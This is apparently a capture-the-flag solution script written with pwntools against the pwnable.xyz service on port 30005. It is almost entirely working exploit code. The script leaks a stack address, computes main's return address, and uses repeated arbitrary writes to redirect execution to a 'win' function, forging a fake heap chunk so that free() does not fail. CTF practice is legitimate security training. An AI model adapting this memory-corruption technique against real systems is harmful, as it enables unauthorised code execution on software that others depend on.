#We can overwrite anything we want to any writable address using option 3 and 1!
#Option 2 gives us stack address -> We know the return address of main function -> Overwrite it with the address of function 'win'
#For no error in 'free' function, make fake chunk!
from pwn import*
import time
s=remote("svc.pwnable.xyz",'30005') 
s.recvuntil(">")
s.send("2\n")
a=s.recvuntil(">").split("\n")[0].split("0x")[-1]
ret=(int(a,16))+0x58
s.send("1\n")
s.recv(1024)
s.send("aaaaaaaa"+p64(ret)+"\n")
s.recv(1024)
s.send("3\n")
s.recv(1024)
s.send("1\n"+"a"*46)
s.send(p64(0x400a3e)+p64(0x601038)+"\n")
s.recv(1024)
s.send("3\n")
s.recv(1024)
s.send("1\n"+"a"*46)
s.send(p64(0x51)+p64(0x601088)+"\n")
s.recv(1024)
s.send("3\n")
s.recv(1024)
s.send("1\n"+"a"*46)
s.send(p64(0x20fb1)+p64(0x601040)+"\n")
s.recv(1024)
s.send("3\n")
s.recv(1024)
s.send("0\n")
s.interactive()
s.close()